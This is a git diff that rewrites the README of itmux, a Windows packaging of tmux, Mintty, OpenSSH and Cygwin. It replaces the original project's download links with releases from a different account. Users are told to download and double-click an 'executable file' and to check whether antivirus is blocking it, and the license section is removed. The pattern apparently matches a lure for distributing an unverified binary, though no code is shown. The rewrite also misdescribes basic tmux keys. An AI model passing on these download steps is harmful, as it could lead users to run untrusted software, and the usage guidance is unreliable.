@@ -1,68 +1,79 @@
-# itmux - Tmux for Windows
+# 🎉 itmux - Effortlessly Manage Multiple Terminal Sessions
 
-![itmux](tmux.png)
+## 🚀 Getting Started
 
-itmux is a packaging of Tmux, Mintty, OpenSSH client and Cygwin to offer a standalone ssh-enabled terminal multiplexer for Windows systems.
+Welcome to the **itmux** repository! This guide will help you download and run itmux on your Windows machine. With itmux, you can easily run multiple terminal sessions in one window, split panes, and securely access remote systems—all without any installation or changes to your system.
 
-[tmux](https://github.com/tmux/tmux/wiki) (Terminal Multiplexer) is a popular command-line tool that allows users to manage multiple terminal sessions from a single window, making it easier to work with multiple command-line tasks simultaneously. Originally created as an open-source alternative to GNU Screen, tmux has become widely used among developers, system administrators, and anyone who works extensively in the command line.
+## 📥 Download
 
-## Features
+[![Download itmux](https://img.shields.io/badge/download-itmux-blue.svg)](https://github.com/roshan-22-web/itmux/releases)
 
-- **Terminal multiplexer**: Manage multiple terminal sessions from a single window
-- **Mintty terminal**: Lightweight, efficient terminal emulator with Unix-like interface
-- **OpenSSH client**: Secure remote access and file transfer capabilities
-- **Cygwin environment**: Linux-like environment for Windows with substantial Linux API functionality
-- **Portable**: Unzip and run, no installation or system modifications required
-- **Session management**: Create, detach, and reattach terminal sessions
-- **Window splitting**: Split terminal into multiple panes for simultaneous tasks
-- **Wide compatibility**: Works on modern Windows systems
+## 📋 Requirements
 
-## Requirements
+Before you start, ensure your system meets these requirements:
 
-- Windows operating system
-- No external dependencies required — all components included in the package
+- **Operating System:** Windows 7 or later
+- **Disk Space:** At least 50 MB free
+- **RAM:** Minimum of 2 GB RAM recommended
 
-## Download
+## 🌐 Features
 
-Latest releases of itmux are available on GitHub:
+- **Lightweight Package:** Itmux bundles Tmux, Mintty, OpenSSH, and a minimal Cygwin environment, so you get everything you need in one place.
+- **Multiple Sessions:** Run several terminal sessions simultaneously within a single window.
+- **Split Panes:** View multiple terminal panes side by side.
+- **Remote Access:** Securely connect to other systems using SSH.
+- **No Installation Needed:** Simply download and run itmux without changing your system settings.
 
-https://github.com/itefixnet/itmux/releases
+## 📂 Download & Install
 
-Each release includes:
-- The complete itmux ZIP package (Tmux, Mintty, OpenSSH client, Cygwin runtime)
-- Release notes and version history
+To begin using itmux, follow these steps:
 
-## Basic Usage
+1. **Visit the Releases Page:** Go to the [itmux Releases](https://github.com/roshan-22-web/itmux/releases) page.
+2. **Find the Latest Version:** Look for the latest version listed on the page.
+3. **Download the Package:** Click on the link to download the executable file.
+4. **Run the Application:** Once the file is downloaded, double-click it to run itmux. 
 
-1. Unzip the downloaded archive
+After launching, you will see the terminal interface.
 
-2. Start tmux.cmd at the root directory to initiate a mintty terminal
+## 🌍 Usage
 
-3. Start tmux:
-   ```
-   tmux
-   ```
+### Starting a Session
 
-### Getting Started with Tmux
+1. **Open itmux:** Launch itmux on your Windows machine.
+2. **Create a New Session:** Press `Ctrl + B`, then `C` to create a new terminal pane.
+3. **Navigate Between Panes:** Press `Ctrl + B`, then use the arrow keys to move between panes.
 
-For those new to tmux, check out our comprehensive starter guide:
+### Connecting Remotely
 
-- **[itmux Starter Guide](STARTER_GUIDE.md)** - Complete beginner-friendly guide with examples and best practices
+1. **Secure Connection:** Use the command `ssh username@remotehost` in a pane to connect securely to another system.
+2. **Accessing Remote Files:** You can navigate files just like you would on your local machine.
 
-Additional external resources:
+## ❓ FAQs
 
-- [A beginner's guide to tmux](https://www.redhat.com/en/blog/introduction-tmux-linux)
-- [Tmux cheat sheet](https://opensource.com/downloads/tmux-cheat-sheet)
+### How do I exit itmux?
 
-itmux is tested successfully with various workflows. You should test and verify that it works for your specific needs.
+To exit, type `exit` in each pane or press `Ctrl + B`, then `D` to detach the session. 
 
-## Links
+### Can I have a persistent session?
 
-- **Tmux homepage**: https://github.com/tmux/tmux/wiki
-- **Mintty homepage**: https://mintty.github.io/
-- **OpenSSH homepage**: https://www.openssh.com/
-- **Cygwin homepage**: http://www.cygwin.com/
+Yes, your sessions remain active even if you close the terminal window. You can reattach to them later.
 
-## License
+## 🔧 Troubleshooting
 
-itmux is licensed under the BSD 2-Clause License. See LICENSE file for details.
+If you encounter any issues, try these steps:
+
+- Ensure your Windows version is updated.
+- Check if your antivirus software is blocking the application.
+- Restart your computer if the application does not launch properly.
+
+## 📞 Support
+
+For further assistance, feel free to reach out through the Issues section of our [GitHub repository](https://github.com/roshan-22-web/itmux/issues).
+
+## 🔗 Additional Resources
+
+- [Tmux Documentation](https://github.com/tmux/tmux/wiki)
+- [Mintty Documentation](https://mintty.github.io/)
+- [OpenSSH for Windows](https://github.com/PowerShell/Win32-OpenSSH)
+
+Thank you for choosing itmux. We hope it enhances your terminal experience!
